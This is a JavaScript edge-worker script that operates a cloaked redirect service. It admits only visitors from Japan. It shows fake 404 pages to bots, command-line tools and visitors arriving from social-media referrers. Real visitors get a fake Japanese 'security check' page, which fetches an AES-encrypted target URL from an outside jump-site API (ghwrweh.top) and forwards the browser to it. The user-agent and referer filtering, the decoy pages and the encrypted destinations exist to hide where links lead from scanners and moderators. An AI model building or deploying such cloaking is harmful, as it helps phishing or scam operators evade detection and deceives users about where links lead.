const AES_KEY = "5Ctianyoumabiiii";
const RATE_LIMIT = 20;
const RATE_LIMIT_TTL = 60;

const fakeHTML = `<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><title>404 Not Found</title></head><body><h1>ページが見つかりませんでした</h1><p>指定されたURLは存在しないか、現在利用できません。</p><hr><small>Cloud Edge CDN</small></body></html>`;

addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const country = request.cf?.country || "";
  if (country !== "JP") {
    return new Response("アクセスは日本国内からのみ許可されています。", { status: 403 });
  }

  const url = new URL(request.url);
  const pathname = url.pathname;
  const ua = request.headers.get("user-agent")?.toLowerCase() || "";
  const referer = request.headers.get("referer")?.toLowerCase() || "";
  const ip = request.headers.get("cf-connecting-ip") || "unknown";

  const cacheKey = new Request("https://limit.local/" + ip);
  const cache = caches.default;
  const cached = await cache.match(cacheKey);
  let count = 0;
  if (cached) {
    const text = await cached.text();
    count = parseInt(text || "0");
    if (count >= RATE_LIMIT) {
      return getFakeResponseByExtension(getExtension(url.pathname));
    }
  }

  const blockedUAs = ["bot", "curl", "wget", "spider", "qq", "wechat", "telegram"];
  if (blockedUAs.some(bot => ua.includes(bot))) {
    return getFakeResponseByExtension(getExtension(url.pathname));
  }

  const blockedReferers = ["t.co", "facebook.com", "twitter.com", "line.me", "discord", "telegram"];
  if (referer && blockedReferers.some(r => referer.includes(r))) {
    return new Response("Referer 拒否", { status: 403 });
  }

  if (pathname.startsWith("/get_url")) {
    const id = url.searchParams.get("id");
    if (!id) return new Response(JSON.stringify({ error: "missing id" }), { status: 400 });

    try {
      const apiUrl = `https://ghwrweh.top/api/jumpSite?siteName=${encodeURIComponent(id)}`;
      const response = await fetch(apiUrl);
      const result = await response.json();
      const siteUrl = result?.data?.siteUrl;
      if (!siteUrl) throw new Error("not found");

      await cache.put(cacheKey, new Response(String(count + 1), {
        headers: { "Cache-Control": `max-age=${RATE_LIMIT_TTL}` }
      }));

      const encUrl = await encryptAES(siteUrl);
      return new Response(JSON.stringify({ enc: encUrl }), {
        headers: { "Content-Type": "application/json" }
      });
    } catch (_) {
      return new Response(JSON.stringify({ error: "fetch failed" }), { status: 502 });
    }
  }

  let id = "";
  const pathParts = pathname.split("/").filter(Boolean);
  const lastPart = pathParts[pathParts.length - 1];

  if (pathParts.length === 1) {
    id = pathParts[0];
  } else {
    try {
      const encryptedSegment = lastPart.split(".")[0];
      const base64 = encryptedSegment.replace(/-/g, "+").replace(/_/g, "/");
      const encryptedBytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
      const iv = encryptedBytes.slice(0, 16);
      const actualEncrypted = encryptedBytes.slice(16);
      const keyBytes = new TextEncoder().encode(AES_KEY);
      const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-CBC" }, false, ["decrypt"]);
      const decryptedBuffer = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, cryptoKey, actualEncrypted);
      const decryptedText = new TextDecoder().decode(decryptedBuffer).replace(/\u0000+$/, "");
      id = decryptedText.split(":")[1] || "";
    } catch (_) {
      return getFakeResponseByExtension(getExtension(pathname));
    }
  }

  if (!id) return getFakeResponseByExtension(getExtension(pathname));

  return new Response(getJSBasedRedirectPage(id), {
    headers: { "Content-Type": "text/html; charset=UTF-8" }
  });
}

function getExtension(pathname) {
  const lastSegment = pathname.split("/").pop() || "";
  const parts = lastSegment.split(".");
  return parts.length > 1 ? parts.pop().toLowerCase() : "";
}

function getJSBasedRedirectPage(id) {
  return `<!DOCTYPE html>
  <html lang="ja">
  <head>
    <meta charset="UTF-8">
    <title>セキュリティ確認中...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex,nofollow">
    <style>
      body {
        font-family: "Segoe UI", "Hiragino Kaku Gothic ProN", sans-serif;
        background-color: #f9f9f9;
        text-align: center;
        padding-top: 120px;
        color: #333;
      }
      .loader {
        border: 6px solid #f3f3f3;
        border-top: 6px solid #3498db;
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
        margin: 30px auto;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      .caption {
        font-size: 14px;
        color: #666;
      }
    </style>
  </head>
  <body>
    <h2>セキュリティ確認中...</h2>
    <p>リンクの安全性を確認しています。まもなくページが表示されます。</p>
    <div class="loader"></div>
    <p class="caption">セキュア認証サービス</p>
    <script>
      fetch('/get_url?id=' + encodeURIComponent(${JSON.stringify(id)}))
        .then(r => r.json())
        .then(d => {
          if (d.enc) {
            decryptAES(d.enc).then(url => {
              setTimeout(() => {
                location.href = url;
              }, 3000);
            });
          } else {
            document.body.innerHTML += '<p style="color:red;">リダイレクト先を取得できませんでした。</p>';
          }
        });

      async function decryptAES(encText) {
        const base64 = encText.replace(/-/g, '+').replace(/_/g, '/');
        const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
        const iv = bytes.slice(0, 16);
        const data = bytes.slice(16);
        const key = await crypto.subtle.importKey(
          "raw",
          new TextEncoder().encode("5Ctianyoumabiiii"),
          { name: "AES-CBC" },
          false,
          ["decrypt"]
        );
        const decrypted = await crypto.subtle.decrypt(
          { name: "AES-CBC", iv },
          key,
          data
        );
        return new TextDecoder().decode(decrypted).replace(/\\u0000+$/, '');
      }
    </script>
  </body>
  </html>`;
}


async function encryptAES(plaintext) {
  const iv = crypto.getRandomValues(new Uint8Array(16));
  const keyBytes = new TextEncoder().encode(AES_KEY);
  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-CBC" }, false, ["encrypt"]);
  const data = new TextEncoder().encode(plaintext);
  const encryptedBuffer = await crypto.subtle.encrypt({ name: "AES-CBC", iv }, cryptoKey, data);
  const fullData = new Uint8Array([...iv, ...new Uint8Array(encryptedBuffer)]);
  const base64 = btoa(String.fromCharCode(...fullData));
  return base64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
